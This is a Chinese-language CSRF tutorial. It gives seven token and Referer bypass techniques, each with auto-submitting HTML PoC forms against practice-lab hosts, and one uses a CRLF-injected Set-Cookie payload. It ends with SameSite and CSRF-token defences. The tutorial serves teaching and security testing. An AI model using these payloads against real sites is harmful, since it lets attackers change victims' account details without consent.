# 简介

跨站请求伪造（也称为 CSRF）是一种网络安全漏洞，攻击者可以利用该漏洞诱导用户执行他们无意执行的操作。它允许攻击者部分规避同源策略，该策略旨在防止不同网站相互干扰。

要使 CSRF 攻击成为可能，必须满足三个关键条件：

- 相关操作。应用程序内存在攻击者有理由诱导执行的操作。这可能是特权操作（例如修改其他用户的权限）或任何针对用户特定数据的操作（例如更改用户自己的密码）。

- 基于 Cookie 的会话处理。执行该操作需要发出一个或多个 HTTP 请求，并且应用程序仅依赖会话 Cookie 来识别发出请求的用户。没有其他机制来跟踪会话或验证用户请求。

- 没有不可预测的请求参数。执行该操作的请求不包含任何攻击者无法确定或猜测其值的参数。例如，当用户更改密码时，如果攻击者需要知道现有密码的值，则该函数不会受到攻击。

虽然 CSRF 通常与基于 Cookie 的会话处理相关，但它也出现在应用程序自动将一些用户凭据添加到请求的其他情况下，例如 HTTP 基本身份验证和基于证书的身份验证。

基本有效负载用于在网页打开时自动提交请求。

```
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```



# 测试CSRF

## 基本步骤

```
1. 在 Burp Suite Professional 中的任意位置选择要测试或利用的请求。
2. 从右键单击上下文菜单中，选择“参与工具/生成 CSRF PoC”。
3. Burp Suite 将生成一些 HTML 代码来触发所选请求（不包含 Cookie，Cookie 将由受害者的浏览器自动添加）。
4. 您可以调整 CSRF PoC 生成器中的各种选项，以微调攻击的各个方面。在某些特殊情况下，您可能需要执行此操作来处理请求的奇特特性。
5. 将生成的 HTML 代码复制到网页中，在登录到易受攻击网站的浏览器中查看，并测试预期请求是否成功发出以及是否发生了所需的操作。
```



## 绕过方法-1：将请求方法更改为 POST → GET

```
测试用例：CSRF 令牌的验证取决于请求方法

1. 与功能交互并拦截请求。
2. 将此请求发送到中继器，然后右键单击更改请求方法。
3. 删除所有 CSRF 参数并生成 CSRF POC。
4. 根据您的偏好进行编辑，例如：

<!DOCTYPE html>
<html>
<!-- CSRF PoC - 由 Burp Suite i0 SecLab 插件生成 -->
<body>
<form method="GET" action="https://ac591fd21f4ab3d2807a1b1d0007000d.web-security-academy.net:443/email/change-email?email=natsu%40natsu.com">
<input type="text" name="email" value="natsu@natsu.com">
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>

5. 完成，将此内容发送给受害者。
```



## 绕过方法 - 2：从 POST 请求中删除 csrf 参数。

```
测试用例：CSRF 令牌验证依赖于令牌是否存在

1. 与功能交互并拦截请求。
2. 将此请求发送到repeater。
3. 删除所有 CSRF 参数并生成 CSRF POC
4. 根据您的偏好进行编辑，例如：

<!DOCTYPE html>
<html>
<!-- CSRF PoC - 由 Burp Suite i0 SecLab 插件生成 -->
<body>
<form method="POST" action="https://ac8a1fbd1e6d76ae806817f900d50032.web-security-academy.net:443/email/change-email">
<input type="text" name="email" value="natsu@natsu.com">
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>

5. 完成，将此内容发送给受害者。
```



## 绕过方法 - 3：在攻击中输入您自己的帐户生成的 CSRF 令牌。

```
测试用例：CSRF 令牌未与用户会话绑定。

1. 与功能交互并拦截请求。
2. 右键单击生成 CSRF POC。
3. 将代码复制到 file.html 中，删除所有会话令牌。
4. 丢弃请求。
5. 将 file.html 发送给受害者。

CSRF 代码示例：

<!DOCTYPE html>
<html>
<!-- CSRF PoC - 由 Burp Suite i0 SecLab 插件生成 -->
<body>
<form method="POST" action="https://acd81f251e0c762980c31ae600c70041.web-security-academy.net:443/email/change-email">
<input type="text" name="email" value="natsu@natsu.com">
<input type="text" name="csrf" value="NqdmYFyfHgQl8JWLKd7YTOC24Tqdedpw">
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```



## 绕过方法 - 4：利用任何其他漏洞来添加你的 cookie，例如 XSS、CRLF → CSRF

```
测试用例 - 1：CSRF 令牌与非会话 Cookie 绑定。当我们有两个 CSRF 令牌时，一个在 Cookie 中，另一个在功能中，这是因为存在两个框架，一个用于会话处理，一个用于 CSRF 防护，而这两个框架并未集成在一起。
Cookie 设置行为甚至不需要与 CSRF 漏洞存在于同一个 Web 应用程序中。如果受控 Cookie 具有合适的范围，则同一 DNS 域中的任何其他应用程序都可能被利用来在目标应用程序中设置 Cookie。例如，staging.demo.normal-website.com 上的 Cookie 设置功能可能会被利用来放置提交到 secure.normal-website.com 的 Cookie。

1. 查找任何允许你在受害者 Cookie 中注入内容的漏洞。
2. 测试 CSRF 令牌是否与会话 ID 绑定（尝试更改会话 ID，但保持原样）
3. 检查您的 CSRF 令牌在受害者请求中替换后是否有效
4. 最后，检查是否可以注入 CRLF 并更改 CSRF Cookie 值
5. 完成，现在创建一个带有 XSS Payload 的 CSRF POC，执行 CRLF 并将其发送给受害者

CSRF 代码示例：

<!DOCTYPE html>
<html>
<!-- CSRF PoC - 由 Burp Suite i0 SecLab 插件生成 -->
<body>
<form method="POST" action="https://ac981fc81ee9f58b80984ae400200076.web-security-academy.net:443/my-account/change-email">
<input type="text" name="csrfKey" value="ntq9GTrV4JhtLaX07sqTnMpOHwMGpaX9">
<input type="text" name="email" value="hehe@hehe.com">
<input type="text" name="csrf" value="6EU5SJ9YKzfOsq9rNgDR8toGy0TKSw81">
<input type="submit" value="发送">
</form>
<img src="http://ac981fc81ee9f58b80984ae400200076.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ntq9GTrV4JhtLaX07sqTnMpOHwMGpaX9" onerror="document.forms[0].submit()">
</body>
</html>

测试用例 - 2： CSRF token 只是简单地复制到 cookie 中，这里的 csrf token 值可以是任意值，只要 cookie 和参数中的值相同即可。

1. 拦截并采取行动，尝试更改 cookie 和参数中的 csrf token。
2. 编写与上述类似的 poc，但这次在 crlf 有效载荷和请求参数中放入相同的 csrf token。
3. 完成，将其发送给受害者。

CSRF POC 示例：

<!DOCTYPE html>
<html>
<!-- CSRF PoC - 由 Burp Suite i0 SecLab 插件生成 -->
<body>
<form method="POST" action="https://ac071f601e8dc74380609c1d000900b3.web-security-academy.net:443/my-account/change-email">
<input type="text" name="csrf" value="K5r92qL9pGzpC2joPMkqgBSY1GG3eo6I">
<input type="text" name="session" value="xdCFpxBe1M0MHvk0DmFuzCRlImMgdxZk">
<input type="text" name="email" value="natsu@natsu.com">
<input type="text" name="csrf" value="fake">
<input type="submit" value="发送">
</form>
<img src="http://ac071f601e8dc74380609c1d000900b3.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit()">
</body>
</html>
```



## 绕过方法 - 5：完全删除 Referrer 标头或抑制它。

```
测试用例：CSRF，其中 Referer 验证依赖于是否存在标头。

1. 拦截请求并尝试将 referer 更改为其他域名。
2. 如果此操作无效，则必须隐藏 referer 标头。
3. 您可以使用 `<meta name="referrer" content="no-referrer">` 或任何其他技术。
4. 完成，使用该技术编写一个常规 POC。

CSRF POC 示例：

<!DOCTYPE html>
<html>
<!-- CSRF PoC - 由 Burp Suite i0 SecLab 插件生成 -->
<body>
<form method="POST" action="https://ac6d1fe21fb2a0c7809510e7001c006c.web-security-academy.net:443/my-account/change-email">
<input type="text" name="session" value="S4dyJbRWg1IqEpZlPkhICE5vJQhnv6ve">
<input type="text" name="email" value="hola@hola.com">
<meta name="referrer" content="no-referrer">
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```



## 绕过方法 - 6：在 Referer 头中尝试使用 Attacker.com 或类似的 Payload。（可以绕过 Referer 验证）



```
Test case: CSRF with broken Referer validation

1. Intercept the request and try changing referer to some other domain. (Check all cases how it is been verified)
2. Now Generate a normal POC and include any JavaScript in the script block to alter the URL and Referer
3. Done Send it to victim.

Example CSRF POC:

<!DOCTYPE html>
<html>
  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->
<body>
	<form method="POST" action="https://ac761f621f79d75680e4054c00160033.web-security-academy.net:443/my-account/change-email">
		<input type="text" name="session" value="rk13v2KYDFByO0OFL0xnHcnIVZbvAHNg">
		<input type="text" name="email" value="gg@gg.com">
		<input type="submit" value="Send">
	</form>
<script>
			history.pushState("", "", "/?ac761f621f79d75680e4054c00160033.web-security-academy.net")
      document.forms[0].submit();
    </script>
</body>
</html>

```



## 绕过方法 - 7：在 csrf 令牌中发送空值。

```
测试用例：CSRF 令牌的验证取决于令牌值

1. 与功能交互并拦截请求。
2. 将此请求发送到中继器。
3. 添加空的 CSRF 参数并生成 CSRF POC
4. 根据您的偏好进行编辑，例如：

<!DOCTYPE html>
<html>
<!-- CSRF PoC - 由 Burp Suite i0 SecLab 插件生成 -->
<body>
<form method="POST" action="https://ac8a1fbd1e6d76ae806817f900d50032.web-security-academy.net:443/email/change-email">
<input type="text" name="email" value="natsu@natsu.com">
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>

5. 完成，将此内容发送给受害者。
```



# 防御

- 使用 SameSite Cookie 防御 CSRF

  - SameSite 属性可用于控制跨站请求中是否提交 Cookie 以及如何提交。通过在会话 Cookie 上设置该属性，应用程序可以阻止浏览器默认自动将 Cookie 添加到请求中，无论请求来自何处。

  - 当服务器发出 Cookie 时，SameSite 属性会被添加到 Set-Cookie 响应头中，该属性可以赋值两个值：Strict 或 Lax。例如：
    - SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Strict;
    - SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Lax;

- 如果 SameSite 属性设置为 Strict，则浏览器不会在来自其他站点的任何请求中包含该 Cookie。这是最有效的防御选项，但它可能会损害用户体验，因为如果已登录用户点击第三方链接进入某个网站，则他们看起来似乎未登录，需要重新登录才能以正常方式与该网站交互。

- 如果 SameSite 属性设置为 Lax，则浏览器将在来自其他网站的请求中包含 Cookie，但前提是满足以下两个条件：

- 请求使用 GET 方法。使用其他方法（例如 POST）的请求将不包含 Cookie。

- 请求由用户进行顶级导航（例如点击链接）生成。其他请求（例如由脚本发起的请求）将不包含 Cookie。

- 在 Lax 模式下使用 SameSite Cookie 确实可以部分防御 CSRF 攻击，因为成为 CSRF 攻击目标的用户操作通常使用 POST 方法实现。这里有两个重要的注意事项：

- 某些应用程序确实使用 GET 请求实现敏感操作。

- 许多应用程序和框架都能够容忍不同的 HTTP 方法。在这种情况下，即使应用程序本身设计为使用 POST 方法，它实际上也会接受切换为使用 GET 方法的请求。

出于上述原因，不建议仅依赖 SameSite Cookie 来防御 CSRF 攻击。但是，如果与 CSRF 令牌结合使用，SameSite Cookie 可以提供额外的防御层，从而可能缓解基于令牌的防御措施中的任何缺陷。

- 使用 CSRF 令牌

- 防御 CSRF 攻击最强大的方法是在相关请求中包含 CSRF 令牌。该令牌应：

  - 与一般会话令牌一样，具有高熵且不可预测的特性。

  - 与用户会话绑定。

  - 在执行相关操作之前，每次都进行严格验证。












































